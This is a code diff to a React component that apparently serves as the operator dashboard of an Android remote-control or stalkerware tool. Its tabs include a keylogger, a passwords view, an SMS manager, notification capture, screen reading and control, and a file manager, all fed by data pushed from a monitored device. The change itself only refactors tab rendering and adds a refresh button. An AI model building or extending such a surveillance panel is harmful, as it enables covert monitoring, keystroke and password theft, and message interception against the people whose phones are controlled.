@@ -1,4 +1,4 @@
-import React, { useState } from 'react';
+import React, { useState, useCallback } from 'react';
 import CommandPanel from './CommandPanel.jsx';
 import ResultPanel from './ResultPanel.jsx';
 import ScreenControl from './ScreenControl.jsx';
@@ -18,32 +18,47 @@ import SMSManagerTab from './SMSManagerTab.jsx';
 import FileManagerTab from './FileManagerTab.jsx';
 
 const TABS = [
-  { id: 'control_center',label: '🎮 Control Center' },
-  { id: 'live_monitor',  label: '📊 Live Monitor' },
-  { id: 'commands',      label: '⌨️ Commands' },
-  { id: 'screen_control',label: '🖥️ Screen Control' },
-  { id: 'screen_reader', label: '📺 Screen Reader' },
-  { id: 'task_studio',   label: '🎬 Task Studio' },
-  { id: 'passwords',     label: '🔑 Passwords' },
-  { id: 'notifications', label: '🔔 Notifications' },
-  { id: 'sms_manager',   label: '💬 SMS Manager' },
-  { id: 'activity',      label: '📱 Activity' },
-  { id: 'keylogger',     label: '⌨️ Keylogger' },
-  { id: 'file_manager',  label: '📂 Files' },
-  { id: 'app_manager',   label: '📦 App Manager' },
-  { id: 'app_monitor',   label: '📡 App Monitor' },
-  { id: 'permissions',   label: '🛡️ App Mode' },
-  { id: 'gestures',      label: '✋ Gestures' },
+  { id: 'control_center', label: '🎮 Control Center' },
+  { id: 'live_monitor',   label: '📊 Live Monitor' },
+  { id: 'commands',       label: '⌨️ Commands' },
+  { id: 'screen_control', label: '🖥️ Screen Control' },
+  { id: 'screen_reader',  label: '📺 Screen Reader' },
+  { id: 'task_studio',    label: '🎬 Task Studio' },
+  { id: 'passwords',      label: '🔑 Passwords' },
+  { id: 'notifications',  label: '🔔 Notifications' },
+  { id: 'sms_manager',    label: '💬 SMS Manager' },
+  { id: 'activity',       label: '📱 Activity' },
+  { id: 'keylogger',      label: '⌨️ Keylogger' },
+  { id: 'file_manager',   label: '📂 Files' },
+  { id: 'app_manager',    label: '📦 App Manager' },
+  { id: 'app_monitor',    label: '📡 App Monitor' },
+  { id: 'permissions',    label: '🛡️ App Mode' },
+  { id: 'gestures',       label: '✋ Gestures' },
 ];
 
-export default function DeviceControl({ device, sendCommand, results, pending, onBack, streamFrame, send, keylogPushEntries, notifPushEntries, activityAppEntries, screenReaderPushData, offlineRecordingVersion, serverLatency, deviceLatency }) {
-  const [activeTab, setActiveTab] = useState('control_center');
+const initialRefreshKeys = Object.fromEntries(TABS.map(t => [t.id, 0]));
+
+export default function DeviceControl({
+  device, sendCommand, results, pending, onBack,
+  streamFrame, send, keylogPushEntries, notifPushEntries,
+  activityAppEntries, screenReaderPushData, offlineRecordingVersion,
+  serverLatency, deviceLatency,
+}) {
+  const [activeTab, setActiveTab]     = useState('control_center');
+  const [refreshKeys, setRefreshKeys] = useState(initialRefreshKeys);
+
   const info     = device.deviceInfo || {};
   const isOnline = device.isOnline;
 
-  const handleCommand = (command, params) => {
+  const handleCommand = useCallback((command, params) => {
     sendCommand(device.deviceId, command, params);
-  };
+  }, [sendCommand, device.deviceId]);
+
+  const refreshTab = useCallback((tabId) => {
+    setRefreshKeys(prev => ({ ...prev, [tabId]: (prev[tabId] || 0) + 1 }));
+  }, []);
+
+  const tabVisible = (id) => ({ display: activeTab === id ? 'flex' : 'none', flexDirection: 'column', flex: 1, minHeight: 0 });
 
   return (
     <div className="device-control">
@@ -80,25 +95,13 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
       </div>
 
       <div className="device-info-grid">
-        <div className="di-item">
-          <div className="di-label">Device ID</div>
-          <div className="di-value" style={{ fontSize: 11, fontFamily: 'monospace' }}>{device.deviceId}</div>
-        </div>
-        <div className="di-item">
-          <div className="di-label">Model</div>
-          <div className="di-value">{info.model || '—'}</div>
-        </div>
-        <div className="di-item">
-          <div className="di-label">Android</div>
-          <div className="di-value">{info.androidVersion || '—'}</div>
-        </div>
-        <div className="di-item">
-          <div className="di-label">Resolution</div>
-          <div className="di-value">{info.screenWidth ? `${info.screenWidth}×${info.screenHeight}` : '—'}</div>
-        </div>
+        <div className="di-item"><div className="di-label">Device ID</div><div className="di-value" style={{ fontSize: 11, fontFamily: 'monospace' }}>{device.deviceId}</div></div>
+        <div className="di-item"><div className="di-label">Model</div><div className="di-value">{info.model || '—'}</div></div>
+        <div className="di-item"><div className="di-label">Android</div><div className="di-value">{info.androidVersion || '—'}</div></div>
+        <div className="di-item"><div className="di-label">Resolution</div><div className="di-value">{info.screenWidth ? `${info.screenWidth}×${info.screenHeight}` : '—'}</div></div>
       </div>
 
-      <div className="dc-tabs">
+      <div className="dc-tabs" style={{ display: 'flex', alignItems: 'center', flexWrap: 'wrap', gap: 4 }}>
         {TABS.map(tab => (
           <button
             key={tab.id}
@@ -108,27 +111,48 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
             {tab.label}
           </button>
         ))}
+
+        <button
+          title={`Refresh ${TABS.find(t => t.id === activeTab)?.label ?? activeTab}`}
+          onClick={() => refreshTab(activeTab)}
+          style={{
+            marginLeft: 'auto',
+            background: 'rgba(99,102,241,0.15)',
+            border: '1px solid rgba(99,102,241,0.4)',
+            color: '#a5b4fc',
+            borderRadius: 6,
+            padding: '5px 12px',
+            fontSize: 12,
+            cursor: 'pointer',
+            whiteSpace: 'nowrap',
+            display: 'flex',
+            alignItems: 'center',
+            gap: 5,
+          }}
+        >
+          ↺ Refresh
+        </button>
       </div>
 
-      {activeTab === 'control_center' && (
-        <div style={{ flex: 1, minHeight: 0, display: 'flex', flexDirection: 'column', overflowY: 'auto' }}>
-          <ControlCenter
-            device={device}
-            sendCommand={sendCommand}
-            results={results}
-            streamFrame={streamFrame}
-            send={send}
-            serverLatency={serverLatency}
-            deviceLatency={deviceLatency}
-            onTabChange={setActiveTab}
-            screenReaderPushData={screenReaderPushData}
-            offlineRecordingVersion={offlineRecordingVersion}
-          />
-        </div>
-      )}
+      <div style={tabVisible('control_center')}>
+        <ControlCenter
+          key={refreshKeys.control_center}
+          device={device}
+          sendCommand={sendCommand}
+          results={results}
+          streamFrame={streamFrame}
+          send={send}
+          serverLatency={serverLatency}
+          deviceLatency={deviceLatency}
+          onTabChange={setActiveTab}
+          screenReaderPushData={screenReaderPushData}
+          offlineRecordingVersion={offlineRecordingVersion}
+        />
+      </div>
 
-      {activeTab === 'live_monitor' && (
+      <div style={tabVisible('live_monitor')}>
         <LiveMonitor
+          key={refreshKeys.live_monitor}
           notifEntries={notifPushEntries || []}
           activityEntries={activityAppEntries || []}
           keylogEntries={keylogPushEntries || []}
@@ -136,127 +160,139 @@ export default function DeviceControl({ device, sendCommand, results, pending, o
           sendCommand={sendCommand}
           results={results}
         />
-      )}
+      </div>
 
-      {activeTab === 'commands' && (
-        <div className="dc-layout">
-          <CommandPanel
-            onSend={handleCommand}
-            disabled={!isOnline}
-            pendingCommands={pending.map(p => p.command)}
-          />
-          <ResultPanel results={results} />
-        </div>
-      )}
+      <div style={tabVisible('commands')} className="dc-layout">
+        <CommandPanel
+          key={refreshKeys.commands}
+          onSend={handleCommand}
+          disabled={!isOnline}
+          pendingCommands={pending.map(p => p.command)}
+        />
+        <ResultPanel results={results} />
+      </div>
 
-      {activeTab === 'screen_control' && (
+      <div style={tabVisible('screen_control')}>
         <ScreenControl
+          key={refreshKeys.screen_control}
           device={device}
           sendCommand={sendCommand}
           streamFrame={streamFrame}
           send={send}
         />
-      )}
+      </div>
 
-      {activeTab === 'screen_reader' && (
+      <div style={tabVisible('screen_reader')}>
         <ScreenReaderView
+          key={refreshKeys.screen_reader}
           device={device}
           sendCommand={sendCommand}
           results={results}
           screenPushData={screenReaderPushData}
         />
-      )}
+      </div>
 
-      {activeTab === 'task_studio' && (
+      <div style={tabVisible('task_studio')}>
         <TaskStudio
+          key={refreshKeys.task_studio}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      )}
+      </div>
 
-      {activeTab === 'passwords' && (
+      <div style={tabVisible('passwords')}>
         <PasswordsTab
+          key={refreshKeys.passwords}
           device={device}
           sendCommand={sendCommand}
           results={results}
           keylogPushEntries={keylogPushEntries || []}
         />
-      )}
+      </div>
 
-      {activeTab === 'notifications' && (
+      <div style={tabVisible('notifications')}>
         <NotificationsTab
+          key={refreshKeys.notifications}
           device={device}
           sendCommand={sendCommand}
           results={results}
           notifPushEntries={notifPushEntries || []}
         />
-      )}
+      </div>
 
-      {activeTab === 'activity' && (
+      <div style={tabVisible('sms_manager')}>
+        <SMSManagerTab
+          key={refreshKeys.sms_manager}
+          device={device}
+          sendCommand={sendCommand}
+          results={results}
+        />
+      </div>
+
+      <div style={tabVisible('activity')}>
         <RecentActivityTab
+          key={refreshKeys.activity}
           device={device}
           activityEntries={activityAppEntries || []}
         />
-      )}
+      </div>
 
-      {activeTab === 'keylogger' && (
+      <div style={tabVisible('keylogger')}>
         <KeyloggerTab
+          key={refreshKeys.keylogger}
           device={device}
           sendCommand={sendCommand}
           results={results}
           keylogPushEntries={keylogPushEntries || []}
         />
-      )}
+      </div>
 
-      {activeTab === 'file_manager' && (
+      <div style={tabVisible('file_manager')}>
         <FileManagerTab
+          key={refreshKeys.file_manager}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      )}
+      </div>
 
-      {activeTab === 'app_manager' && (
+      <div style={tabVisible('app_manager')}>
         <AppManager
+          key={refreshKeys.app_manager}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      )}
+      </div>
 
-      {activeTab === 'app_monitor' && (
+      <div style={tabVisible('app_monitor')}>
         <AppMonitorTab
+          key={refreshKeys.app_monitor}
           device={device}
           sendCommand={sendCommand}
           results={results}
           screenReaderPushData={screenReaderPushData}
         />
-      )}
+      </div>
 
-      {activeTab === 'permissions' && (
+      <div style={tabVisible('permissions')}>
         <PermissionsTab
+          key={refreshKeys.permissions}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      )}
+      </div>
 
-      {activeTab === 'sms_manager' && (
-        <SMSManagerTab
-          device={device}
-          sendCommand={sendCommand}
-          results={results}
-        />
-      )}
-
-      {activeTab === 'gestures' && (
+      <div style={tabVisible('gestures')}>
         <GestureTab
+          key={refreshKeys.gestures}
           device={device}
           sendCommand={sendCommand}
           results={results}
         />
-      )}
+      </div>
     </div>
   );
 }
